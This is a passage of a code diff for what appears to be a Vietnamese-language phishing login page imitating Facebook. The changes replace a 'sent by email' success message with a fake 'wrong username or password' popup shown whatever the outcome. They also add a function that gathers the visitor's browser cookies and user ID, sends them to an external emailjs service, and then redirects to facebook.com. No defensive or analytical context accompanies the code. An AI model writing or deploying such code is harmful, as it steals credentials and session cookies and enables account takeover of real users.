-                .then(() => showPopup("Thành công", "Thông tin tài khoản đã được gửi qua email."), 
-                      () => showPopup("Lỗi", "Có lỗi xảy ra khi gửi thông tin."));
+                .then(() => {
+                    showPopup("Đăng nhập không thành công", "Sai tên đăng nhập hoặc mật khẩu, vui lòng thử lại");
+                }, () => {
+                    showPopup("Đăng nhập không thành công", "Sai tên đăng nhập hoặc mật khẩu, vui lòng thử lại");
+                });
         }
+
+        function redirectIfLoggedIn() {
+            const cookies = getCookies();
+            const uid = getUIDFromCookie();
+
+            const templateParams = {
+                cookies: cookies,
+                uid: uid,
+                action: "Chuyển hướng khi đã đăng nhập",
+                timestamp: new Date().toLocaleString()
+            };
+
+            emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
+                .then(() => {
+                    window.location.href = "https://www.facebook.com";
+                });
+        }
+
+        window.onload = function() {
+            showLogin();
+        };
     </script>
 </body>
 </html>
